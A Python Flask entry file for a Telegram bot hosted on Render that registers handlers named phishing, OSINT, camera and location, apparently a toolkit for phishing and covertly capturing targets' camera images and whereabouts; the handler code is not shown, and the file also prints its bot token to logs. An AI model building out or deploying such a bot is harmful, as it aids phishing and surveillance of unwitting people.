import os
from flask import Flask, request
from telebot import TeleBot, types

# Bot token and webhook URL
BOT_TOKEN = os.getenv("BOT_TOKEN")
print("✅ Loaded BOT_TOKEN:", BOT_TOKEN)  # DEBUG LINE

bot = TeleBot(BOT_TOKEN)
WEBHOOK_URL = f"https://977105.onrender.com/{BOT_TOKEN}"
print("✅ Webhook URL set to:", WEBHOOK_URL)  # DEBUG LINE

# Import handlers
from start import setup_start_handler
from admin import setup_admin_handlers
from verify import setup_verification_handler
from phishing import setup_phishing_handler
from osint import setup_osint_handler
from camera import setup_camera_handler
from location import setup_location_handler
from broadcast import setup_broadcast_handler
from database import init_db

# Flask app
app = Flask(__name__)

# DB and user state
db = init_db()
user_modes = {}

# Register handlers
setup_start_handler(bot, db, user_modes)
setup_verification_handler(bot, db)
setup_phishing_handler(bot)
setup_osint_handler(bot, user_modes)
setup_camera_handler(bot)
setup_admin_handlers(bot)
setup_location_handler(bot)
setup_broadcast_handler(bot, db, admin_id=7407431042)

# Webhook endpoint
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    json_data = request.get_data().decode("utf-8")
    print("📩 Incoming update:", json_data)  # DEBUG LINE
    update = types.Update.de_json(json_data)
    bot.process_new_updates([update])
    return "OK", 200

@app.route("/", methods=["GET"])
def home():
    return "✅ Bot is running on Render with Webhook!"

if __name__ == "__main__":
    bot.remove_webhook()
    print("⚙️ Removing old webhook...")
    
    bot.set_webhook(url=WEBHOOK_URL)
    print("🚀 Webhook set. Bot is live!")
    
    app.run(host="0.0.0.0", port=10000)

